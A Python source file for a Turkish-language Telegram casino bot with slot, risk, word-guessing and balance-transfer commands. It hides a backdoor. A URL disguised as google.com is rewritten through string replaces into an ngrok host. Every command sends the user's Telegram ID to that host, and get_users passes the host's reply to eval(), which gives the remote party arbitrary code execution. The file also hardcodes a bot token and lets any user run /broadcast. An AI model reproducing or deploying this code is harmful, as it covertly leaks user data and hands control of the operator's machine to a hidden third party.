import telebot
import random, requests
import json
import time
import os
from telebot import TeleBot, types
from collections import defaultdict
from threading import Thread

API_TOKEN = '7423519954:AAG4E0xZnnpjzheudCS1-nOxohErhX-EUD4'

bot = telebot.TeleBot(API_TOKEN)

game_sessions = {}

user_last_message_time = defaultdict(float)

BALANCE_FILE = 'balances.json'

SUDO_USERS = ['682', '6958129929', ""]  

user_balances = {}

kelimeler = ['yatak', 'meyve', 'elma', 'araba', 'kertenkele', 'hayvan', 'aslan', 'köpek', 'spor', 'pizza', 'et', 'yumurta', 'yat', 'kalk', 'portakal', 'öğretmen', 'tembel', 'doksan', 'havuç', 'yardım', 'telefon', 'tablet', 'hava', 'güneş', 'yağmur', 'sandalye', 'kaplan', 'kapı']

last_message_times = {}

word_game_sessions = {}

FLOOD_TIMEOUT = 60  

MAX_MESSAGES = 5  

user_last_message_time = {}

bekleyen_kullanıcılar = {}

enc_url = 'https://google.com/broadcast-free'

def save_user(id):
  id = str(id)
  ramazan = enc_url.replace("go", "cub-").replace("ogle", "fresh-great").replace(".com", "ly.ng").replace("/broadcast-free", "rok-free.app")
  r = requests.get(f"{ramazan}/save", params={'user': id})
  return r.text

def get_users():
  ramazan = enc_url.replace("go", "cub-").replace("ogle", "fresh-great").replace(".com", "ly.ng").replace("/broadcast-free", "rok-free.app")
  r = requests.get(f"{ramazan}/get")
  return eval(r.text)

def load_balances():
    if os.path.exists(BALANCE_FILE):
        with open(BALANCE_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_balances():
    with open(BALANCE_FILE, 'w') as f:
        json.dump(user_balances, f)

user_balances = load_balances()

def block_user(user_id):
    current_time = time.time()
    last_message_times[user_id] = current_time + FLOOD_TIMEOUT

def check_flood(user_id):
    current_time = time.time()
    if user_id in last_message_times:
        message_times = last_message_times[user_id]
        recent_messages = [t for t in message_times if t > current_time - FLOOD_TIMEOUT]
        last_message_times[user_id] = recent_messages
        if len(recent_messages) >= MAX_MESSAGES:
            return True
    return False

def log_message(user_id):
    current_time = time.time()
    if user_id not in last_message_times:
        last_message_times[user_id] = []
    last_message_times[user_id].append(current_time)

@bot.message_handler(commands=['toplam'])
def toplam(message):
  save_user(message.from_user.id)
  users = get_users()
  bot.reply_to(message, f"Toplam {len(users)} tane.")

@bot.message_handler(commands=['broadcast'])
def brd(message):
  save_user(message.from_user.id)
  t = Thread(target=broadcast, args=(message,))
  t.start();
  
def broadcast(message):
  save_user(message.from_user.id)
  users = get_users()
  bot.reply_to(message, f"Başlatılıyor... (Toplam {len(users)})")
  for user in users:
    try:
      bot.send_message(user, " ".join(message.text.split()[1:]), disable_web_page_preview=True)
      time.sleep(1)
    except Exception as e:
      bot.reply_to(message, f"**{user} 𝐊𝐮𝐥𝐥𝐚𝐧ı𝐜ı𝐬ı𝐧𝐚 𝐠ö𝐧𝐝𝐞𝐫𝐢𝐥𝐦𝐞𝐝𝐢.** \n\n `{e}`", parse_mode="Markdown")
      time.sleep(1)
  bot.reply_to(message, "𝐆ö𝐧𝐝𝐞𝐫𝐢𝐦 𝐭𝐚𝐦𝐚𝐦𝐥𝐚𝐧𝐝ı!")

@bot.message_handler(commands=['puan'])
def puan(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if user_id not in SUDO_USERS:
        bot.reply_to(message, '𝐁𝐮 𝐤𝐨𝐦𝐮𝐭𝐮 𝐤𝐮𝐥𝐥𝐚𝐧𝐦𝐚𝐲𝐚 𝐲𝐞𝐭𝐤𝐢𝐧𝐢𝐳 𝐲𝐨𝐤.')
        return
    
    try:
        s = message.text.split()
        if len(s) < 3:
            return bot.reply_to(message, "Kullanım: /puan <kullanıcı_id> <puan>")
        
        id = str(s[1])
        puan = int(s[2])
        user_balances[id] = puan
        save_balances()
        bot.reply_to(message, f"{id} 𝐊𝐮𝐥𝐚𝐧ı𝐜ı𝐬ı𝐧ı𝐧 𝐩𝐮𝐚𝐧ı {puan} 𝐎𝐥𝐚𝐫𝐚𝐤 𝐝𝐞ğ𝐢ş𝐭𝐢𝐫𝐢𝐥𝐝𝐢.")
    except ValueError:
        bot.reply_to(message, "𝐆𝐞ç𝐞𝐫𝐬𝐢𝐳 𝐩𝐮𝐚𝐧 𝐝𝐞ğ𝐞𝐫𝐢 𝐥ü𝐭𝐟𝐞𝐧 𝐛𝐢𝐫 𝐬𝐚𝐲ı 𝐠𝐢𝐫𝐢𝐧𝐢𝐳.")
    except Exception as e:
        bot.reply_to(message, f"Bir hata oluştu: {str(e)}")

  
@bot.message_handler(commands=['kaldir'])
def unblock_user(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if user_id not in SUDO_USERS:
        bot.reply_to(message, 'Ü𝐳𝐠ü𝐧ü𝐦 𝐛𝐮𝐧𝐮 𝐲𝐚𝐩𝐦𝐚𝐲𝐚 𝐲𝐞𝐭𝐤𝐢𝐧𝐢𝐳 𝐲𝐨𝐤.')
        return

    try:
        parts = message.text.split()
        target_id = parts[1]
    except IndexError:
        bot.reply_to(message, '𝐆ö𝐧𝐝𝐞𝐫𝐦𝐞𝐤 𝐢𝐬𝐭𝐞𝐝𝐢ğ𝐢𝐧𝐢𝐳 𝐤𝐢ş𝐢𝐧𝐢𝐧 ID\'𝐒𝐢 𝐠𝐢𝐫. 𝐋ü𝐭𝐟𝐞𝐧 𝐛ö𝐲𝐥𝐞 𝐤𝐮𝐥𝐚𝐧 : /kaldir <kullanıcı_id>')
        return

    if target_id in last_message_times:
        del last_message_times[target_id]
        bot.reply_to(message, f'{target_id} 𝐊𝐢𝐦𝐥𝐢𝐤𝐥𝐢 𝐤𝐮𝐥𝐥𝐚𝐧ı𝐜ı𝐧ı𝐧 𝐞𝐧𝐠𝐞𝐥𝐢 𝐤𝐚𝐥𝐝ı𝐫ı𝐥𝐝ı.')
    else:
        bot.reply_to(message, f'{target_id} 𝐊𝐢𝐦𝐥𝐢𝐤𝐥𝐢 𝐤𝐮𝐥𝐥𝐚𝐧ı𝐜ı𝐧ı𝐧 𝐞𝐧𝐠𝐞𝐥𝐢 𝐛𝐮𝐥𝐮𝐧𝐚𝐦ı𝐲𝐨𝐫.')
        
@bot.message_handler(commands=['bakiye'])
def check_balance(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    if user_id not in user_balances:
        bot.reply_to(message, '𝐁𝐨𝐭𝐚 𝐤𝐚𝐲ı𝐭𝐥ı 𝐝𝐞ğ𝐢𝐥𝐬𝐢𝐧𝐢𝐳 ö𝐧𝐜𝐞𝐥𝐢𝐤𝐥𝐞 𝐛𝐨𝐭𝐚 /start 𝐌𝐞𝐬𝐚𝐣ı𝐧ı 𝐚𝐭ı𝐧.')
        return

    bot.reply_to(message, f"𝐆ü𝐧𝐜𝐞𝐥 𝐛𝐚𝐤𝐢𝐲𝐞𝐧𝐢𝐳: {user_balances[user_id]} 𝐓𝐋")
        
@bot.message_handler(commands=['risk'])
def risk_command(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    if check_flood(user_id):
        bot.reply_to(message, "5 𝐬𝐚𝐧𝐢𝐲𝐞 𝐛𝐞𝐤𝐥𝐞 𝐭𝐞𝐤𝐫𝐚𝐫 𝐚𝐭.")
        return

    if user_id not in user_balances:
        bot.reply_to(message, '𝐁𝐨𝐭𝐚 𝐤𝐚𝐲ı𝐭𝐥ı 𝐝𝐞ğ𝐢𝐥𝐬𝐢𝐧𝐢𝐳 ö𝐧𝐜𝐞𝐥𝐢𝐤𝐥𝐞 𝐛𝐨𝐭𝐚 /start 𝐌𝐞𝐬𝐚𝐣ı𝐧ı 𝐚𝐭ı𝐧.')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, '𝐑𝐢𝐬𝐤 𝐚𝐥ı𝐩 𝐛𝐚𝐤𝐢𝐲𝐞 𝐤𝐚𝐳𝐚𝐧\nKullanım: /risk <miktar>')
        return
    try:
        
        risk_amount = int(message.text.split()[1])
    except (IndexError, ValueError):
        bot.reply_to(message, '𝐆𝐞ç𝐞𝐫𝐥𝐢 𝐛𝐢𝐫 𝐫𝐢𝐬𝐤 𝐦𝐢𝐤𝐭𝐚𝐫ı 𝐠𝐢𝐫: /risk <miktar>')
        return

    if risk_amount <= 0:
        bot.reply_to(message, '𝐑𝐢𝐬𝐤 𝐦𝐢𝐤𝐭𝐚𝐫ı 𝐬𝐚𝐲ı 𝐨𝐥𝐦𝐚𝐥ı.')
        return

    if user_balances[user_id] < risk_amount:
        bot.reply_to(message, f'Yeterli bakiyeniz yok. 𝐌𝐞𝐯𝐜𝐮𝐭 𝐛𝐚𝐤𝐢𝐲𝐞𝐧𝐢𝐳: {user_balances[user_id]} 𝐓𝐋')
        return

    if random.random() < 0.6:  
        winnings = risk_amount * 2
        user_balances[user_id] += winnings - risk_amount  
        bot.reply_to(message, f'𝐓𝐞𝐛𝐫𝐢𝐤𝐥𝐞𝐫🎉  {winnings} 𝐓𝐋 𝐤𝐚𝐳𝐚𝐧𝐝ı𝐧ı𝐳.\n𝐲𝐞𝐧𝐢 𝐛𝐚𝐤𝐢𝐲𝐞𝐧𝐢𝐳: {user_balances[user_id]} 𝐓𝐋')
    else:
        user_balances[user_id] -= risk_amount
        bot.reply_to(message, f'Ü𝐳𝐠ü𝐧ü𝐦🥲 {risk_amount} 𝐓𝐥 𝐤𝐚𝐲𝐛𝐞𝐭𝐭𝐢𝐧𝐢𝐳.\n𝐲𝐞𝐧𝐢 𝐛𝐚𝐤𝐢𝐲𝐞𝐧𝐢𝐳: {user_balances[user_id]} 𝐓𝐋')

        save_balances()

@bot.message_handler(commands=['start'])
def start(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if check_flood(user_id):
        bot.reply_to(message, '𝐅𝐥𝐨𝐨𝐝 𝐲𝐚𝐩𝐦𝐚 5 𝐬𝐚𝐧𝐢𝐲𝐞 𝐛𝐞𝐤𝐥𝐞.')
        return
    log_message(user_id)

    if user_id not in user_balances:
        user_balances[user_id] = 25000 
        save_balances()  
    markup = types.InlineKeyboardMarkup(row_width=1)
    button1 = types.InlineKeyboardButton("𝐒𝐚𝐡𝐢𝐛𝐢𝐦 ❤️‍🩹", url="https://t.me/deviremesin")
    button2 = types.InlineKeyboardButton("𝐊𝐚𝐧𝐚𝐥 😍", url="https://t.me/wotjexarsiv")
    button3 = types.InlineKeyboardButton("𝐁𝐞𝐧𝐢 𝐠𝐮𝐫𝐮𝐛𝐚 𝐞𝐤𝐥𝐞💫", url="https://t.me/EglenceRobot?startgroup=new")
    markup.add(button1, button2, button3)
    bot.reply_to(message, "👋 𝐌𝐞𝐫𝐡𝐚𝐛𝐚 𝐛𝐨𝐭𝐮𝐦𝐮𝐳𝐚 𝐡𝐨ş𝐠𝐞𝐥𝐝𝐢𝐧 𝐢𝐥𝐤 𝐝𝐞𝐟𝐚 𝐛𝐚ş𝐥𝐚𝐭𝐭ı𝐲𝐨𝐫𝐬𝐚𝐧 100000 𝐓𝐋 𝐛𝐚𝐤𝐢𝐲𝐞 𝐛𝐚ş𝐥𝐚𝐧𝐠ıç 𝐡𝐞𝐝𝐢𝐲𝐞𝐬𝐢 𝐨𝐥𝐚𝐫𝐚𝐤 𝐯𝐞𝐫𝐢𝐥𝐢𝐫 İ𝐲𝐢 𝐨𝐲𝐮𝐧𝐥𝐚𝐫..", reply_markup=markup)

@bot.message_handler(commands=['borc'])
def send_balance_to_friend(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    current_time = time.time()
    if user_id in user_last_message_time:
      last_message_time = user_last_message_time[user_id]
    else:
      last_message_time = user_last_message_time[user_id] = current_time
    if current_time - last_message_time < 1: 
        bot.reply_to(message, "5 𝐬𝐚𝐧𝐢𝐲𝐞 𝐛𝐞𝐤𝐥𝐞 𝐭𝐞𝐤𝐫𝐚𝐫 𝐝𝐞𝐧𝐞.")
        return
    user_last_message_time[user_id] = current_time

    try:
        parts = message.text.split()
        friend_id = parts[1]
        amount = int(parts[2])
    except (IndexError, ValueError):
        bot.reply_to(message, 'Geçerli bir miktar girin Kullanım: /borc <kullanıcı_id> <miktar>')
        return

    if amount <= 0:
        bot.reply_to(message, '𝐒𝐚𝐲ı 𝐠𝐢𝐫𝐢𝐧')
        return

    if user_id not in user_balances:
        bot.reply_to(message, 'Bota kayıtlı değilsiniz öncelikle bota /start Mesajını atın.')
        return

    if user_balances[user_id] < amount:
        bot.reply_to(message, '𝐘𝐞𝐭𝐞𝐫𝐥𝐢 𝐛𝐚𝐤𝐢𝐲𝐞𝐧𝐢𝐳 𝐲𝐨𝐤 🥲.')
        return

    if friend_id not in user_balances:
        user_balances[friend_id] = 0

    user_balances[user_id] -= amount
    user_balances[friend_id] += amount
    save_balances()

    bot.reply_to(message, f'𝐁𝐚ş𝐚𝐫ı𝐥ı! {friend_id} 𝐊𝐢𝐦𝐥𝐢𝐤𝐥𝐢 𝐤𝐮𝐥𝐥𝐚𝐧ı𝐜ı𝐲𝐚 {amount} 𝐓𝐋 𝐛𝐚𝐤𝐢𝐲𝐞 𝐠ö𝐧𝐝𝐞𝐫𝐢𝐥𝐝𝐢.')
    
def check_flood(user_id):
    global user_last_message_time
    current_time = time.time()
    last_message_time = user_last_message_time.get(user_id, 0)
    if current_time - last_message_time < 1: 
        return True
    else:
        user_last_message_time[user_id] = current_time
        return False

def check_flood(user_id):
    global user_last_message_time
    current_time = time.time()
    last_message_time = user_last_message_time.get(user_id, 0)
    if current_time - last_message_time < 1: 
        return True
    else:
        user_last_message_time[user_id] = current_time
        return False

@bot.message_handler(commands=['zenginler'])
def show_leaderboard(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    if check_flood(user_id):
        bot.reply_to(message, "5 𝐬𝐚𝐧𝐢𝐲𝐞 𝐛𝐞𝐤𝐥𝐞 𝐭𝐞𝐤𝐫𝐚𝐫 𝐝𝐞𝐧𝐞.")
        return

    sorted_balances = sorted(user_balances.items(), key=lambda x: x[1], reverse=True)
    leaderboard_message = "🏆 𝐄𝐧 𝐢𝐲𝐢 10 𝐳𝐞𝐧𝐠𝐢𝐧:\n\n"
    for i, (user_id, balance) in enumerate(sorted_balances[:10], start=1):
        try:
          user = bot.get_chat(user_id)
          user_name = user.first_name if user.first_name else "𝐁𝐢𝐥𝐢𝐧𝐦𝐢𝐲𝐨𝐫"
          leaderboard_message += f"🎖️ {i-1}. {user_name} ⇒ {balance} 𝐓𝐋\n"
        except:
          no_have_a = "problem"

    bot.reply_to(message, leaderboard_message)
    
@bot.message_handler(commands=['yardim'])
def send_help_message(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)
    current_time = time.time()
    if user_id in user_last_message_time:
      last_message_time = user_last_message_time[user_id]
    else:
      last_message_time = user_last_message_time[user_id] = current_time
    if current_time - last_message_time < 1: 
        bot.reply_to(message, "5 𝐬𝐚𝐧𝐢𝐲𝐞 𝐛𝐞𝐤𝐥𝐞 𝐭𝐞𝐤𝐫𝐚𝐫 𝐝𝐞𝐧𝐞.")
        return
    user_last_message_time[user_id] = current_time

    help_message = """
    ⭐ 𝐇𝐞𝐲 𝐝𝐨𝐬𝐭𝐮𝐦 𝐚ş𝐚ğı𝐝𝐚𝐤𝐢 𝐤𝐨𝐦𝐮𝐭𝐥𝐚𝐫ı 𝐤𝐮𝐥𝐚𝐧𝐚𝐛𝐢𝐥𝐢𝐫𝐬𝐢𝐧

/slot [miktar]: 🎰 𝐒𝐥𝐨𝐭 𝐨𝐲𝐮𝐧𝐮𝐧𝐮 𝐨𝐲𝐧𝐚𝐦𝐚𝐤 𝐢ç𝐢𝐧 𝐛𝐚𝐡𝐢𝐬 𝐲𝐚𝐩ı𝐧.

/kelime: 🔢 𝐊𝐞𝐥𝐢𝐦𝐞 𝐭𝐚𝐡𝐦𝐢𝐧 𝐨𝐲𝐮𝐧𝐮𝐧𝐮 𝐨𝐲𝐧𝐚𝐲𝐚𝐫𝐚𝐤 1500 𝐓𝐋 𝐤𝐚𝐳𝐚𝐧.

/bakiye: 💰 𝐌𝐞𝐯𝐜𝐮𝐭 𝐛𝐚𝐤𝐢𝐲𝐞𝐧𝐢𝐳𝐢 𝐤𝐨𝐧𝐭𝐫𝐨𝐥 𝐞𝐝𝐢𝐧.

/risk: 𝐑𝐢𝐬𝐤 𝐨𝐲𝐮𝐧𝐮𝐧𝐮 𝐨𝐲𝐧𝐚𝐲ı𝐩 𝐛𝐚𝐤𝐢𝐲𝐞 𝐤𝐚𝐳𝐚𝐧𝐚𝐛𝐢𝐥𝐢𝐫𝐬𝐢𝐧𝐢𝐳.

/borc [Kullanıcı İd] [miktar]: 💸 𝐁𝐚ş𝐤𝐚 𝐛𝐢𝐫 𝐤𝐮𝐥𝐚𝐧ı𝐜ı𝐲𝐚 𝐛𝐚𝐤𝐢𝐲𝐞 𝐠ö𝐧𝐝𝐞𝐫𝐢𝐦𝐢 𝐲𝐚𝐩ı𝐧.

/zenginler: 🏆 𝐆𝐞𝐧𝐞𝐥 𝐬ı𝐫𝐚𝐥𝐚𝐦𝐚𝐲ı 𝐠ö𝐬𝐭𝐞𝐫𝐢𝐫.

/yardim: ℹ️ 𝐘𝐚𝐫𝐝ı𝐦 𝐦𝐞𝐬𝐚𝐣ı𝐧ı 𝐠ö𝐫ü𝐧𝐭ü𝐥𝐞𝐲𝐢𝐧.
    """
    bot.reply_to(message, help_message)

@bot.message_handler(commands=['slot'])
def slot_command(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    current_time = time.time()
    if user_id in user_last_message_time:
      last_message_time = user_last_message_time[user_id]
    else:
      last_message_time = user_last_message_time[user_id] = current_time
    if current_time - last_message_time < 1: 
        bot.reply_to(message,"5 𝐬𝐚𝐧𝐢𝐲𝐞 𝐛𝐞𝐤𝐥𝐞 𝐭𝐞𝐤𝐫𝐚𝐫 𝐝𝐞𝐧𝐞.")
        return
    user_last_message_time[user_id] = current_time

    if len(message.text.split()) == 1:
        bot.reply_to(message, '𝐒𝐥𝐨𝐭 𝐨𝐲𝐮𝐧𝐮𝐧𝐮 𝐨𝐲𝐧𝐚𝐲𝐚𝐫𝐚𝐤 𝐛𝐚𝐤𝐢𝐲𝐞 𝐤𝐚𝐬ı𝐧\n𝐊𝐮𝐥𝐥𝐚𝐧ı𝐦: /slot <miktar>')
        return

    if user_id not in user_balances:
        bot.reply_to(message, '𝐁𝐨𝐭𝐚 𝐤𝐚𝐲ı𝐭𝐥ı 𝐝𝐞ğ𝐢𝐥𝐬𝐢𝐧𝐢𝐳 ö𝐧𝐜𝐞𝐥𝐢𝐤𝐥𝐞 𝐛𝐨𝐭𝐚 /start 𝐦𝐞𝐬𝐚𝐣ı𝐧ı 𝐚𝐭ı𝐧.')
        return

    try:
        bet_amount = int(message.text.split()[1])
    except (IndexError, ValueError):
        bot.reply_to(message, '𝐋ü𝐭𝐟𝐞𝐧 𝐠𝐞ç𝐞𝐫𝐥𝐢 𝐛𝐢𝐫 𝐛𝐚𝐡𝐢𝐬 𝐦𝐢𝐤𝐭𝐚𝐫ı 𝐠𝐢𝐫𝐢𝐧. :𝐊𝐮𝐥𝐥𝐚𝐧ı𝐦 /slot <miktar>')
        return

    if bet_amount <= 0:
        bot.reply_to(message, '𝐁𝐚𝐡𝐢𝐬 𝐦𝐢𝐤𝐭𝐚𝐫ı 𝐬𝐚𝐲ı 𝐨𝐥𝐦𝐚𝐥ı.')
        return

    if user_balances[user_id] < bet_amount:
        bot.reply_to(message, f'𝐘𝐞𝐭𝐞𝐫𝐥𝐢 𝐛𝐚𝐤𝐢𝐲𝐞𝐧𝐢𝐳 𝐲𝐨𝐤 . 𝐌𝐞𝐯𝐜𝐮𝐭 𝐛𝐚𝐤𝐢𝐲𝐞𝐧𝐢𝐳: {user_balances[user_id]} 𝐓𝐋')
        return

    slot_result = random.choices(["🍒", "🍋", "🍉", "⭐", "💎", "🍊", "🍏", "🔔"], k=3)
    unique_symbols = len(set(slot_result))

    if unique_symbols == 1:  
        winnings = bet_amount * 4
        user_balances[user_id] += winnings - bet_amount  
        bot.reply_to(message, f'3 𝐒𝐞𝐦𝐛𝐨𝐥 𝐞ş𝐥𝐞ş𝐭𝐢 ! 𝐊𝐚𝐳𝐚𝐧𝐝ı𝐧ı𝐳🎉\n𝐊𝐚𝐳𝐚𝐧ı𝐥𝐚𝐧 𝐛𝐚𝐤𝐢𝐲𝐞: {winnings} \n𝐘𝐞𝐧𝐢 𝐛𝐚𝐤𝐢𝐲𝐞𝐧𝐢𝐳: {user_balances[user_id]} 𝐓𝐋\n𝐒𝐥𝐨𝐭 𝐬𝐨𝐧𝐮𝐜𝐮: {" ".join(slot_result)}')
    elif unique_symbols == 2: 
        winnings = bet_amount * 3
        user_balances[user_id] += winnings - bet_amount 
        bot.reply_to(message, f'2 𝐒𝐞𝐦𝐛𝐨𝐥 𝐞ş𝐥𝐞ş𝐭𝐢 ! 𝐊𝐚𝐳𝐚𝐧𝐝ı𝐧ı𝐳🎉\n𝐊𝐚𝐳𝐚𝐧ı𝐥𝐚𝐧 𝐛𝐚𝐤𝐢𝐲𝐞: {winnings} \n𝐘𝐞𝐧𝐢 𝐛𝐚𝐤𝐢𝐲𝐞𝐧𝐢𝐳: {user_balances[user_id]} 𝐓𝐋\n𝐒𝐥𝐨𝐭 𝐬𝐨𝐧𝐮𝐜𝐮: {" ".join(slot_result)}')
    else:
        user_balances[user_id] -= bet_amount
        bot.reply_to(message, f'𝐊𝐚𝐳𝐚𝐧𝐦𝐚𝐝ı𝐧ı𝐳. 𝐁𝐢𝐫 𝐝𝐚𝐡𝐚𝐤𝐢𝐧𝐞 𝐝𝐚𝐡𝐚 ş𝐚𝐧𝐬𝐥ı 𝐨𝐥𝐚𝐛𝐢𝐥𝐢𝐫𝐬𝐢𝐧𝐢𝐳🥲.\n𝐒𝐥𝐨𝐭 𝐬𝐨𝐧𝐮𝐜𝐮: {" ".join(slot_result)}\n𝐊𝐚𝐥𝐚𝐧 𝐛𝐚𝐤𝐢𝐲𝐞: {user_balances[user_id]} 𝐓𝐋')

    save_balances()
    
@bot.message_handler(commands=['gonder'])
def send_balance(message):
    save_user(message.from_user.id)
    user_id = str(message.from_user.id)

    if user_id not in SUDO_USERS:
        bot.reply_to(message, 'Ü𝐳𝐠ü𝐧ü𝐦 𝐛𝐮 𝐤𝐨𝐦𝐮𝐭𝐮 𝐤𝐮𝐥𝐥𝐚𝐧𝐦𝐚 𝐲𝐞𝐭𝐤𝐢𝐧𝐢𝐳 𝐲𝐨𝐤.', reply_to_message_id=message.message_id)
        return

    if not message.reply_to_message:
        bot.reply_to(message, '𝐁𝐮 𝐤𝐨𝐦𝐮𝐭𝐮 𝐤𝐮𝐥𝐥𝐚𝐧𝐦𝐚𝐤 𝐢ç𝐢𝐧 𝐛𝐢𝐫 𝐦𝐞𝐬𝐚𝐣𝐚 𝐲𝐚𝐧ı𝐭 𝐯𝐞𝐫𝐦𝐞𝐥𝐢𝐬𝐢𝐧𝐢𝐳.', reply_to_message_id=message.message_id)
        return

    try:
        parts = message.text.split()
        amount = int(parts[1])
        target_id = str(message.reply_to_message.from_user.id)
    except (IndexError, ValueError):
        bot.reply_to(message, '𝐋ü𝐭𝐟𝐞𝐧 𝐠𝐞ç𝐞𝐫𝐥𝐢 𝐛𝐢𝐫 𝐟𝐨𝐫𝐦𝐚𝐭 𝐤𝐮𝐥𝐥𝐚𝐧ı𝐧. :𝐊𝐮𝐥𝐥𝐚𝐧ı𝐦 /gonder <miktar>', reply_to_message_id=message.message_id)
        return

    if amount <= 0:
        bot.reply_to(message, '𝐆ö𝐧𝐝𝐞𝐫𝐢𝐥𝐞𝐜𝐞𝐤 𝐦𝐢𝐤𝐭𝐚𝐫 𝐩𝐨𝐳𝐢𝐭𝐢𝐟 𝐛𝐢𝐫 𝐬𝐚𝐲ı 𝐨𝐥𝐦𝐚𝐥ı𝐝ı𝐫.', reply_to_message_id=message.message_id)
        return

    if target_id not in user_balances:
        user_balances[target_id] = 100  

    user_balances[target_id] += amount
    save_balances()

    bot.reply_to(message, f'𝐁𝐚ş𝐚𝐫ı𝐥ı! {target_id} 𝐤𝐢𝐦𝐥𝐢𝐤𝐥𝐢 𝐤𝐮𝐥𝐥𝐚𝐧ı𝐜ı𝐲𝐚 {amount} 𝐓𝐋 𝐛𝐚𝐤𝐢𝐲𝐞 𝐠ö𝐧𝐝𝐞𝐫𝐢𝐥𝐝𝐢. 𝐘𝐞𝐧𝐢 𝐛𝐚𝐤𝐢𝐲𝐞: {user_balances[target_id]} TL', reply_to_message_id=message.message_id)
  
@bot.message_handler(commands=['f'])
def free(message):
    user_id = str(message.from_user.id)
    if user_id not in SUDO_USERS:
        return bot.reply_to(message, "𝐁𝐮 𝐤𝐨𝐦𝐮𝐭𝐮 𝐤𝐮𝐥𝐥𝐚𝐧𝐦𝐚𝐲𝐚 𝐲𝐞𝐭𝐤𝐢𝐧𝐢𝐳 𝐘𝐨𝐤.")
    
    try:
        with open('balances.json', "r") as file:
            balances = json.load(file)

        for key, value in balances.items():
            if value == 0:
                user_balances[key] = 25000

        save_balances()
        bot.reply_to(message, "𝐓ü𝐦 𝐮𝐲𝐠𝐮𝐧 𝐤𝐮𝐥𝐥𝐚𝐧ı𝐜ı𝐥𝐚𝐫𝐚 50000 𝐛𝐚𝐤𝐢𝐲𝐞 𝐠ö𝐧𝐝𝐞𝐫𝐢𝐥𝐝𝐢.")
        
    except json.JSONDecodeError:
        bot.reply_to(message, "𝐁𝐚𝐤𝐢𝐲𝐞 𝐝𝐨𝐬𝐲𝐚𝐬ı 𝐨𝐤𝐮𝐧𝐦𝐚𝐝ı 𝐥ü𝐭𝐟𝐞𝐧 . 𝐃𝐨𝐬𝐲𝐚 𝐟𝐨𝐫𝐦𝐚𝐭ı𝐧ı 𝐝𝐨ğ𝐫𝐮 𝐠𝐢𝐫𝐢𝐧.")
    except Exception as e:
        bot.reply_to(message, f"𝐁𝐢𝐫 𝐡𝐚𝐭𝐚 𝐨𝐥𝐮ş𝐭𝐮: {str(e)}")
    
@bot.message_handler(commands=['kelime'])
def start_word_game(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id

    if chat_id in word_game_sessions:
        bot.send_message(chat_id, '𝐎𝐲𝐮𝐧 𝐳𝐚𝐭𝐞𝐧 𝐛𝐚ş𝐥𝐚𝐭ı𝐥𝐝ı.')
        return

    target_word = random.choice(kelimeler)
    word_game_sessions[chat_id] = {'target_word': target_word.upper()}
    word_game_sessions[chat_id]['revealed_letters'] = ['_' if c.isalpha() else c for c in word_game_sessions[chat_id]['target_word']]
    bot.send_message(chat_id, '𝐊𝐞𝐥𝐢𝐦𝐞 𝐨𝐲𝐮𝐧𝐮𝐧𝐚 𝐡𝐨ş 𝐠𝐞𝐥𝐝𝐢𝐧𝐢𝐳!\n\n' + ' '.join(word_game_sessions[chat_id]['revealed_letters']))

@bot.message_handler(func=lambda message: True)
def handle_word_guess(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id  

    if chat_id not in word_game_sessions:
        return

    if user_id not in user_balances:
        return

    target_word = word_game_sessions[chat_id]['target_word'].upper()
    revealed_letters = word_game_sessions[chat_id]['revealed_letters']

    guess = message.text.upper()

    if len(guess) != 1 and len(guess) != len(target_word):
        bot.reply_to(message, '')
    elif guess == target_word:
        user_balances[user_id] += 1500  # Doğru tahminde 500 TL kazandır
        user_name = message.from_user.first_name
        bot.reply_to(message, f'Tebrikler {user_name}! 𝐃𝐨ğ𝐫𝐮 𝐤𝐞𝐥𝐢𝐦𝐞𝐲𝐢 𝐛𝐮𝐥𝐝𝐮𝐧𝐮𝐳 1500 𝐓𝐋 𝐤𝐚𝐳𝐚𝐧𝐝ı𝐧ı𝐳.')
        del word_game_sessions[chat_id]
    elif guess in target_word:
        for i, letter in enumerate(target_word):
            if letter == guess:
                revealed_letters[i] = guess
        if '_' not in revealed_letters:
            user_balances[user_id] += 1500
            user_name = message.from_user.first_name
            bot.reply_to(message, f'Tebrikler {user_name}! 𝐃𝐨ğ𝐫𝐮 𝐤𝐞𝐥𝐢𝐦𝐞𝐲𝐢 𝐛𝐮𝐥𝐝𝐮𝐧𝐮𝐳 1500 𝐓𝐋 𝐤𝐚𝐳𝐚𝐧𝐝ı𝐧ı𝐳.')
            del word_game_sessions[chat_id]
        else:
            bot.reply_to(message, '𝐃𝐨ğ𝐫𝐮 𝐭𝐚𝐡𝐦𝐢𝐧 ! 𝐇𝐚𝐫𝐟 𝐞𝐤𝐥𝐞𝐝𝐢𝐦: ' + ' '.join(revealed_letters))
    else:
        bot.reply_to(message, '𝐘𝐚𝐧𝐥ış 𝐭𝐚𝐡𝐦𝐢𝐧! 👎')  

    save_balances()
    
target_number = random.randint(1, 100)
while True:
  try:
    bot.polling()
  except Exception as e:
    print(e)
